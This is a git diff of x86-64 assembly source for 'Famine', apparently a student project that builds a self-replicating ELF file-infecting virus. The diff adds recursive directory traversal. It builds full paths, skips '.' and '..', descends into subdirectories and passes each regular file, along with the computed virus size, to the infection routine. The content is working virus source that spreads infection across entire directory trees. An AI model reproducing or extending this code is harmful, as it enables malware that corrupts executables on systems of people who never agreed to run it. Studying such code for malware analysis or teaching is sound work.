@@ -13,6 +13,7 @@ section .text
 	global _start
 	global _string
 	global _read_dir
+	global _ft_strlen
 	extern _treat_file
 	extern _final_end
 
@@ -23,7 +24,10 @@ _string:
 	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
 
 _start:
-	enter 16, 0
+;	enter 16, 0
+	push rbp
+	mov rbp, rsp
+	sub rsp, 16
 ;;;;;;;;;;;;;;;;;;;;;;
 ; save all registers ;
 ; to pop them in the ;
@@ -43,7 +47,15 @@ _start:
 	push r14
 	push r15
 ;;;;;;;;;;;;;;;;;;;;;;
+;	push 0x000000000000002f ; /
+	push 0x000000000000002e ; .
+	push 0x000000000000002e
+	mov rdi, rsp
+	mov rsi, rsp
+	add rsi, 8
 	call _read_dir
+	pop rdi
+	pop rdi
 	lea rax, [rel _o_entry] ; mov in rax the o_entry address
 	cmp QWORD [rax], 0 ; if this address is 0, so we are in famine exec, and we need to exit
 	jne _jmp_to_o_entry
@@ -68,14 +80,79 @@ _jmp_to_o_entry:
 	leave
 	jmp [rax] ; jmp to o_entry
 
-_read_dir:
-	enter 336, 0
+_ft_strlen: ; void ft_strlen(char *str)
+	enter 16, 0
+	xor rax, rax
+	mov rbx, rdi
+	cmp rdi, 0
+	je _strlen_end
+	mov rcx, -1
+	cld
+	repne scasb
+	sub rdi, rbx
+	mov rax, rdi
+	sub rax, 1
+_strlen_end:
+	leave
+	ret
+
+_read_dir: ; void read_dir(char *actual_directory, char *path_of_dir)
+	push rbp
+	mov rbp, rsp
+	sub rsp, 368
+;	enter 336, 0
 	; rsp + 0: dir struct
 	; rsp + 280: virus size
 	; rsp + 288: fd directory
 	; rsp + 296: pointer to current dir file
 	; rsp + 304: buffer end address
-	; rsp + 312: unused
+	; rsp + 312: address dir name 1arg
+	; rsp + 320: size arg 1
+	; rsp + 328: size arg 2
+	; rsp + 336: total size
+	; rsp + 344: 2 arg
+	; rsp + size: size of total path for this dir
+	mov QWORD [rsp + 312], rdi ; store first arg in stack
+	mov QWORD [rsp + 344], rsi
+	mov rdi, rsi ; calcul len of arg 2
+	call _ft_strlen
+	mov QWORD [rsp + 328], rax ; store arg2 len in stack
+;	sub rsp, rax ; create our last variable in stack : buffer[arg2_len]
+	mov rdi, QWORD [rsp + 312] ; take len of arg1
+	call _ft_strlen
+	mov QWORD [rsp + 320], rax ; store result in stack
+;	sub rsp, rax ; buffer[arg2_len + arg1_len]
+;	sub rsp, 2 ; buffer[arg2_len + arg1_len + 2], the + 2 correspond to the / and the last \0
+	mov r10, QWORD [rsp + 320]
+	mov QWORD [rsp + 336], r10
+	mov r10, QWORD [rsp + 328]
+	add QWORD [rsp + 336], r10
+	add QWORD [rsp + 336], 2
+; now we copy in our buffer: path_of_dir + '/' + actual_directory + '\0'
+	mov rdi, rsp
+	sub rdi, QWORD [rsp + 336]
+	mov rsi, QWORD [rsp + 344]
+	mov rcx, QWORD [rsp + 328]
+	cld
+	rep movsb
+; add /
+	mov rdi, rsp
+	sub rdi, QWORD [rsp + 336]
+	add rdi, QWORD [rsp + 328]
+	mov BYTE [rdi], 0x2f ; '/'
+; add arg1
+	add rdi, 1
+	mov rsi, QWORD [rsp + 312]
+	mov rcx, QWORD [rsp + 320]
+	cld
+	rep movsb
+; add \0
+	mov rdi, rsp
+	sub rdi, QWORD [rsp + 336]
+	add rdi, QWORD [rsp + 328]
+	add rdi, 1
+	add rdi, QWORD [rsp + 320]
+	mov BYTE [rdi], 0
 
 _calculate_virus_size:
 ; virus_size = (&_final_end + 2) - &_string
@@ -88,13 +165,22 @@ _calculate_virus_size:
 	mov QWORD [rsp + 280], r10 ; virus size = r10
 
 _open_dir:
-	push 0x0000000000002f2e ; push "./"
-	mov rdi, rsp ; mov the stack address on rdi, addres of our string
+;	push 0x0000000000002f2e ; push "./"
+;	mov rdi, QWORD [rsp + 312] ; mov the stack address on rdi, addres of our string
+	mov rdi, rsp
+	mov r10, QWORD [rsp + 336]
+	sub rdi, r10
 	xor rsi, rsi ; rsi = 0, RD_ONLY
 	xor rdx, rdx ; rdx = 0, flag unused
 	mov rax, 0x2 ; open syscall number
+	mov r10, QWORD [rsp + 336]
+	sub rsp, r10
+	sub rsp, 8
+	mov QWORD [rsp], r10
+	add QWORD [rsp], 8
 	syscall ; open
-	pop rdi ; we pushed, so we pop
+	add rsp, QWORD [rsp]
+;	pop rdi ; we pushed, so we pop
 	cmp rax, -1 ; if open return something under or equal of -1, jump to end
 	jle _end
 	mov QWORD [rsp + 288], rax ; fd directory = return of open (fd)
@@ -105,7 +191,13 @@ _file_loop:
 	mov rdi, QWORD [rsp + 288] ; mov the fd to the first argument
 	mov rsi, rsp ; mov the stack pointer to the second argument
 	mov rax, 217 ; getdents64 syscall number
+	mov r10, QWORD [rsp + 336]
+	sub rsp, r10
+	sub rsp, 8
+	mov QWORD [rsp], r10
+	add QWORD [rsp], 8
 	syscall
+	add rsp, QWORD [rsp]
 ; check getdents64 return
 	cmp rax, 0 ; we check if getdents64 read something, if not, we are at the end of dir or their is an error
 	jle _end
@@ -121,8 +213,13 @@ _read_data:
 	mov r10, QWORD [rsp + 304]
 	cmp QWORD [rsp + 296], r10 ; r10 is the address of the end of the buffer, so we check if our address is too far in memory
 	jge _file_loop ; and we jump to read again the dir datas, to see if their is anothers datas to treat
+; offset 18 is the file type. We check if it's a directory
 	xor r12, r12 ; r12 = 0
+	mov r12b, BYTE [rsi + 18]
+	cmp r12, 4
+	je _recursiv_infect
 ; offset 18 is the file type. We check if it's a regular file
+	xor r12, r12 ; r12 = 0
 	mov r12b, BYTE [rsi + 18] 
 	cmp r12, 8
 	jne _continue
@@ -130,12 +227,40 @@ _read_data:
 	add rsi, 19 ; in the dirent struct, the name of te file is at offset 19
 	mov rdi, rsi
 	mov rsi, QWORD [rsp + 280]
+	mov r10, QWORD [rsp + 336]
+	mov rdx, rsp
+	sub rdx, r10
+	sub rsp, r10
+	sub rsp, 8
+	mov QWORD [rsp], r10
+	add QWORD [rsp], 8
 	call _treat_file
+	add rsp, QWORD [rsp]
 ; reinit rsi for next loop
+	jmp _continue
+
+_recursiv_infect:
 	mov rsi, [rsp + 296]
+	add rsi, 19
+	cmp WORD [rsi], 0x002e
+	je _continue
+	cmp WORD [rsi], 0x002e2e
+	je _continue
+	mov rdi, rsi
+	mov rsi, rsp
+	mov r10, QWORD [rsp + 336]
+	sub rsi, r10
+	sub rsp, r10
+	sub rsp, 8
+	mov QWORD [rsp], r10
+	add QWORD [rsp], 8
+_lab_lol:
+	call _read_dir
+	add rsp, QWORD [rsp]
 
 _continue:
 ; reinit/increment registers/stack variable for next loop
+	mov rsi, [rsp + 296]
 	xor r11, r11 ; clear r11
 	mov r11w, WORD [rsi + 16] ; in dirent struct, at offset 16, their is a short (2 bytes) describing the len of the file
 	add rsi, r11 ; we add this len on our current struct address to access next struct
